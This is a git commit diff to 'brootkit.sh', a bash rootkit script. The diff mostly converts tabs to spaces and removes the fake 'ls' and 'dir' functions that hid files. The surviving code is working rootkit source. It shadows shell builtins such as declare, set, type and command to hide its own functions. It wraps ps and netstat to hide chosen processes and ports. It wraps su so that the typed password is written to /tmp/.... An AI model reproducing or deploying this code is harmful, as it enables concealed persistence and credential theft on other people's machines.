2a146436210303144f8c671da638b05701e39dd1
Yeoh zhou <Yeohzhou@gmail.com>
2017-08-14 01:30:00 +0800

    Update brootkit.sh

--- brootkit.sh
+++ brootkit.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 # Lightweight rootkit implemented by bash shell scripts v0.08
 #
-# by wzt 2015 	http://www.cloud-sec.org
+# by wzt 2015   http://www.cloud-sec.org
 #
 
 #declare -r builtin
@@ -19,7 +19,7 @@ BR_ROOTKIT_PATH="/usr/include/..."
 
 function abcdmagic()
 {
-	:
+    :
 }
 
 function br_hide_engine()
@@ -38,11 +38,11 @@ function br_hide_engine()
                                 "^abcdmagic.*()|3" "^/usr/bin/dir.*()|5"
                                 "^/bin/ps.*()|5" "^/bin/netstat.*()|5"
                                 "^/bin/ls.*()|5" "^br_hide_file=|5"
-				"^set.*()|19" "^br_hide_engine.*()|30"
+                "^set.*()|19" "^br_hide_engine.*()|30"
                                 )
         local func_line br_func func_name func_num
 
-	echo "$1" >.br.tmp
+    echo "$1" >.br.tmp
         for br_func in ${brootkit_func[*]}
         do
                 func_name=`echo $br_func | cut -d "|" -f 1`
@@ -52,69 +52,69 @@ function br_hide_engine()
                 #echo $func_line
                 sed -i "$func_line,+$func_num d" .br.tmp >/dev/null 2>&1
         done
-	cat .br.tmp; rm -f .br.tmp
+    cat .br.tmp; rm -f .br.tmp
 }
 
 function builtin()
 {
-	local fake_a
+    local fake_a
 
-	unset command
-	case $1 in 
-		"declare"|"set"|"unset"|"command"|"type"|"typeset")
-        		fake_a="$(command builtin $1 $2)"
-			br_hide_engine "$fake_a"
-			reset_command
-			return ;;
-		"builtin")
-			echo "bash: builtin: builtin: syntax error, bash($BASH_VERSION) is not support."
-			reset_command
-			return ;;
-		*)
-			command builtin $1 $2
-			reset_command
-			;;
-	esac
+    unset command
+    case $1 in 
+        "declare"|"set"|"unset"|"command"|"type"|"typeset")
+                fake_a="$(command builtin $1 $2)"
+            br_hide_engine "$fake_a"
+            reset_command
+            return ;;
+        "builtin")
+            echo "bash: builtin: builtin: syntax error, bash($BASH_VERSION) is not support."
+            reset_command
+            return ;;
+        *)
+            command builtin $1 $2
+            reset_command
+            ;;
+    esac
 }
 
 function declare()
 {
-	local fake_a
+    local fake_a
 
-	unset command
-	case $1 in 
-		"")
-        		fake_a="$(command declare $1 $2)"
-			br_hide_engine "$fake_a"
-			reset_command
-			return ;;
-		"-f"|"-F")
-        		fake_a="$(command declare $1 $2)"
-        		fake_b=${fake_a/\/bin\/ls?()*/}
-			echo -n "$fake_b"
-			reset_command
-			return ;;
-		*)
-        		command declare $1 $2
-			reset_command
-			return ;;
-	esac
+    unset command
+    case $1 in 
+        "")
+                fake_a="$(command declare $1 $2)"
+            br_hide_engine "$fake_a"
+            reset_command
+            return ;;
+        "-f"|"-F")
+                fake_a="$(command declare $1 $2)"
+                fake_b=${fake_a/\/bin\/ls?()*/}
+            echo -n "$fake_b"
+            reset_command
+            return ;;
+        *)
+                command declare $1 $2
+            reset_command
+            return ;;
+    esac
 }
 
 function typeset()
 {
         local fake_a 
 
-	unset command
+    unset command
         case $1 in
                 ""|"-f"|"-F")
                         fake_a="$(command declare $1 $2)"
-			br_hide_engine "$fake_a"
-			reset_command
+            br_hide_engine "$fake_a"
+            reset_command
                         return ;;
                 *)
                         command typeset $1 $2
-			reset_command
+            reset_command
                         return ;;
         esac
 }
@@ -125,25 +125,25 @@ function type()
                 "builtin"|"declare"|"set"|"unset"|"type"|"typeset")
                         echo "$1 is a shell builtin"
                         return ;;
-		"dir")
-			echo "dir is /usr/bin/dir"
-			return ;;
-		"ls")
-			echo "ls is aliased to ls --color=tty"
-			return ;;
-		"ps")
-			echo "ps is /bin/ps"
-			return ;;
-		"netstat")
-			echo "netstat is hashed (/bin/netstat)"
-			return ;;
-		"/bin/ls"|"/usr/bin/dir"|"/bin/ps"|"/bin/netstat")
-			echo "$1 is $1"
-			return ;;
+        "dir")
+            echo "dir is /usr/bin/dir"
+            return ;;
+        "ls")
+            echo "ls is aliased to ls --color=tty"
+            return ;;
+        "ps")
+            echo "ps is /bin/ps"
+            return ;;
+        "netstat")
+            echo "netstat is hashed (/bin/netstat)"
+            return ;;
+        "/bin/ls"|"/usr/bin/dir"|"/bin/ps"|"/bin/netstat")
+            echo "$1 is $1"
+            return ;;
                 *)
-			unset command
+            unset command
                         command type $1 $2
-			reset_command
+            reset_command
                         return ;;
         esac
 }
@@ -152,20 +152,20 @@ function set()
 {
         local fake_a
 
-	unset command
+    unset command
         case $1 in
                 "")
                         fake_a="$(command set)"
-			br_hide_engine "$fake_a"
-			reset_command
+            br_hide_engine "$fake_a"
+            reset_command
                         return ;;
-		"-x"|"+x")
-			reset_command
-			return ;;
+        "-x"|"+x")
+            reset_command
+            return ;;
                 *)
-			echo $1 $2
+            echo $1 $2
                         command set $1 $2
-			reset_command
+            reset_command
                         return ;;
         esac
 }
@@ -189,7 +189,7 @@ function fake_command()
                         echo "bash: syntax error, bash($BASH_VERSION) is not support."
                         return ;;
                 *)
-			unset command
+            unset command
                         command $1 $2
                         reset_command
                         return ;;
@@ -200,69 +200,69 @@ function command()
 {
         case $1 in
                 "builtin")
-			builtin $2 $3
-			return ;;
+            builtin $2 $3
+            return ;;
                 "declare")
-			declare $2 $3
-			return ;;
-		"set")
-			set $2 $3
-			return ;;
-		"unset")
-			fake_unset $2 $3
-			. $BR_ROOTKIT_PATH/brootkit.sh
-			return ;;
-		"type")
-			type $2 $3
-			return ;;
-		"typeset")
-			typeset $2 $3
-			return ;;
-		"command")
-			fake_command $2 $3
-			return ;;
+            declare $2 $3
+            return ;;
+        "set")
+            set $2 $3
+            return ;;
+        "unset")
+            fake_unset $2 $3
+            . $BR_ROOTKIT_PATH/brootkit.sh
+            return ;;
+        "type")
+            type $2 $3
+            return ;;
+        "typeset")
+            typeset $2 $3
+            return ;;
+        "command")
+            fake_command $2 $3
+            return ;;
                 *)
-			unset command
-			command $2 $3
-			. $BR_ROOTKIT_PATH/brootkit.sh
-			return ;;
+            unset command
+            command $2 $3
+            . $BR_ROOTKIT_PATH/brootkit.sh
+            return ;;
         esac
 }
 
 function reset_command()
 {
-	function command()
-	{
-        	case $1 in
-                	"builtin")
-                        	builtin $2 $3
-                        	return ;;
-                	"declare")
-                        	declare $2 $3
-                        	return ;;
-                	"set")
-                        	set $2 $3
-                        	return ;;
-                	"unset")
-                        	fake_unset $2 $3
-                        	. $BR_ROOTKIT_PATH/brootkit.sh
-                        	return ;;
-                	"type")
-                        	type $2 $3
-                        	return ;;
-                	"typeset")
-                        	typeset $2 $3
-                        	return ;;
-                	"command")
-                        	fake_command $2 $3
-                        	return ;;
-                	*)
-                        	unset command
-                        	command $2 $3
-                        	. $BR_ROOTKIT_PATH/brootkit.sh
-                        	return ;;
-        	esac
-	}
+    function command()
+    {
+            case $1 in
+                    "builtin")
+                            builtin $2 $3
+                            return ;;
+                    "declare")
+                            declare $2 $3
+                            return ;;
+                    "set")
+                            set $2 $3
+                            return ;;
+                    "unset")
+                            fake_unset $2 $3
+                            . $BR_ROOTKIT_PATH/brootkit.sh
+                            return ;;
+                    "type")
+                            type $2 $3
+                            return ;;
+                    "typeset")
+                            typeset $2 $3
+                            return ;;
+                    "command")
+                            fake_command $2 $3
+                            return ;;
+                    *)
+                            unset command
+                            command $2 $3
+                            . $BR_ROOTKIT_PATH/brootkit.sh
+                            return ;;
+            esac
+    }
 }
 
 function su()
@@ -301,119 +301,17 @@ function su()
         /bin/su && unset su && echo $pass >> /tmp/...
 }
 
-unalias ls >/dev/null 2>&1
-
 function max_file_length()
 {
-	local tmp_file sum=0 n=0
+    local tmp_file sum=0 n=0
 
-	for tmp_file in `/bin/ls $@`
-	do
-		n=${#tmp_file}
-		[ $n -gt $sum ] && sum=$n
-	done
-	
-	return $sum
-}
-
-function ls()
-{
-	local fake_file max_col_num file_format
-	local hide_file hide_flag file_arg old_ifs
-	local file_len=0 sum=0 n=0 display_mode=0
-
-	max_col_num=`stty size|cut -d " " -f 2`
-
-        . $BR_ROOTKIT_PATH/brconfig.sh
-        br_load_config $BR_ROOTKIT_PATH/br.conf
-
-	for file_arg in $@
-	do
-        	if echo $file_arg|grep -q -e "^-.*l.*"; then
-			display_mode=1; break
-        	fi
-	done
-
-	case $display_mode in
-	0)
-		unset -f /bin/ls
-		max_file_length $@
-		file_len=$?
-
-		for fake_file in $(/bin/ls $@)
-        	do
-			hide_flag=0
-        		old_ifs=$IFS; IFS=","
-        		for hide_file in ${br_hide_file[@]}
-        		do
-                		if echo "$fake_file"|grep -e "^$hide_file" >/dev/null;then
-					hide_flag=1; break
-				fi
-			done
-       			IFS=$old_ifs
-
-			[ $hide_flag -eq  1 ] && continue
-
-			n=${#fake_file}
-			((sum=sum+n+file_len))
-
-			if [ $sum -gt $max_col_num ];then
-				file_format="%-$file_len""s\n"
-				printf $file_format $fake_file
-				sum=0
-			else
-				file_format="%-$file_len""s "
-				printf $file_format $fake_file
-			fi
-        	done
-
-		[ $sum -le $max_col_num ] && echo ""
-		reset_ls
-		return ;;
-	1)	
-		unset -f /bin/ls
-
-		fake_file=`/bin/ls $@`
-        	old_ifs=$IFS; IFS=","
-        	for hide_file in ${br_hide_file[@]}
-        	do
-			fake_file=`echo "$fake_file" | sed -e '/'$hide_file'/d'`
-        	done
-        	IFS=$old_ifs
-		echo "$fake_file"
-		reset_ls
-
-		return ;;
-	esac
-}
-
-function dir()
-{
-	/bin/ls $@
-}
-
-function /usr/bin/dir()
-{
-	unset -f /bin/ls
-	/bin/ls $@
-	reset_ls
-}
-
-function reset_ls()
-{
-	function /bin/ls()
-	{
-		unset -f /bin/ls
-		/bin/ls $@
-		reset_ls
-	}
-}
-
-function /bin/ls()
-{
-	unset -f /bin/ls
-	/bin/ls $@
-	reset_ls
+    for tmp_file in `/bin/ls $@`
+    do
+        n=${#tmp_file}
+        [ $n -gt $sum ] && sum=$n
+    done
+    
+    return $sum
 }
 
 function ps()
@@ -428,11 +326,11 @@ function ps()
         proc_name=`/bin/ps $@`
         for hide_proc in ${br_hide_proc[@]}
         do
-        	proc_name=`echo "$proc_name" | sed -e '/'$hide_proc'/d'`
+            proc_name=`echo "$proc_name" | sed -e '/'$hide_proc'/d'`
         done
 
         echo "$proc_name"
-	IFS=$old_ifs
+    IFS=$old_ifs
 }
 
 function reset_ps()
@@ -456,17 +354,17 @@ function netstat()
 {
         local hide_port tmp_port old_ifs
 
-	. $BR_ROOTKIT_PATH/brconfig.sh
-	br_load_config $BR_ROOTKIT_PATH/br.conf
+    . $BR_ROOTKIT_PATH/brconfig.sh
+    br_load_config $BR_ROOTKIT_PATH/br.conf
 
-	old_ifs=$IFS; IFS=","
+    old_ifs=$IFS; IFS=","
         tmp_port=`/bin/netstat $@`
         for hide_port in ${br_hide_port[@]}
         do
                 tmp_port=`echo "$tmp_port" | sed -e '/'$hide_port'/d'`
         done
         echo "$tmp_port"
-	IFS=$old_ifs
+    IFS=$old_ifs
 }
 
 function reset_netstat()
